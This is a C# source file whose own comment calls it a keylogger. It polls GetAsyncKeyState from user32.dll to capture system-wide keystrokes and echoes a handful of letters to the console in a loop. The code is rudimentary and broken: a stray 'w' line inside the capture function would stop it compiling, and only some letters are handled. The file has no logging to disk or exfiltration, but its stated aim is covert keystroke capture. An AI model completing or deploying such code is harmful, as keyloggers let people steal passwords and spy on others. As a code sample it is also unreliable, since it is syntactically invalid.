using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.IO;
using System.Threading;

namespace Key
{

    internal class Program
    {
        /*The keylogger must work in console application regardless of whether or not the user is on the console application
        In order for this to happen we must initialize a dll (domain link library) that gets the keystate as well as get the function 
        low level keyboard proc

        */
       


        [DllImport("user32.dll")]
        static extern int GetAsyncKeyState(int vKey);
        static int WM_KEYDOWN = 0x0100;
        static int test = 0x7A;

      
        static void Main(string[] args)
        {

                
            bool Transistor = true;
            int limiter = 0;
            int inputlmb = 0x01;
            int inputrmb = 0x02;
            int h = 0x48;
            int e = 0x45;
            int l = 0x4C;
            int o = 0x4F;
            int a = 0x41;
            int b = 0x42;
            int c = 0x43;
            int d = 0x44;
            int f = 0x46;
            int g = 0x47;
            int i = 0x49;
            int j = 0x4A;
            int k = 0x4B;
            int m = 0x4D;
            int n = 0x4E;
            int p = 0x50;
            int q = 0x51;
            int r = 0x52;
            int s = 0x53;
            int t = 0x54;
            int u = 0x55;
            int v = 0x56;
            int w = 0x57;
            int x = 0x58;
            int y = 0x59;
            int z = 0x5A;
            var keystate = GetAsyncKeyState(h);
            keystate = GetAsyncKeyState(e);
            keystate = GetAsyncKeyState(l);
            keystate = GetAsyncKeyState(o);
            keystate = GetAsyncKeyState(j);
            keystate = GetAsyncKeyState(a);
            keystate = GetAsyncKeyState(b);
            keystate = GetAsyncKeyState(c);
            keystate = GetAsyncKeyState(d);
            keystate = GetAsyncKeyState(f);
            keystate = GetAsyncKeyState(g);
            keystate = GetAsyncKeyState(i);
            keystate = GetAsyncKeyState(j);
            keystate = GetAsyncKeyState(k);
            keystate = GetAsyncKeyState(m);
            keystate = GetAsyncKeyState(n);
            keystate = GetAsyncKeyState(p);
            keystate = GetAsyncKeyState(q);
            keystate = GetAsyncKeyState(r);
            keystate = GetAsyncKeyState(s);
            keystate = GetAsyncKeyState(t);
            keystate = GetAsyncKeyState(u);
            keystate = GetAsyncKeyState(v);
            keystate = GetAsyncKeyState(w);
            keystate = GetAsyncKeyState(y);
            keystate = GetAsyncKeyState(z);
            void Function()
            {
                keystate = GetAsyncKeyState(a);
                if (keystate > 1 && limiter != 1)
                {
                    Console.Write("a");
                }
                keystate = GetAsyncKeyState(b);
                if (keystate > 1 && limiter != 1)
                {
                    Console.Write("b");
                }
                keystate = GetAsyncKeyState(c);
                if (keystate > 1 && limiter != 1)
                {
                    Console.Write("c");
                }
                keystate = GetAsyncKeyState(d);
                if (keystate > 1 && limiter != 1)
                {
                    Console.Write("d");
                }
                keystate = GetAsyncKeyState(e);
                if (keystate > 1 && limiter != 1)
                {
                    Console.Write("e");
                }
                keystate = GetAsyncKeyState(f);
w
            }
            //HookCallback(nCode, wParam, lParam)

            while (Transistor)
                {
                    if (limiter > 0)
                    {

                        limiter = 0;
                    }
                

                 /*   IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
                    {
                   
                        return (IntPtr)0;

                    }; */
                    if (limiter < 1)
                    {
                    
                      
                       Function();
                       Thread.Sleep(75);
                       limiter += 1;
                }
               
            }
            
        }

    }
}
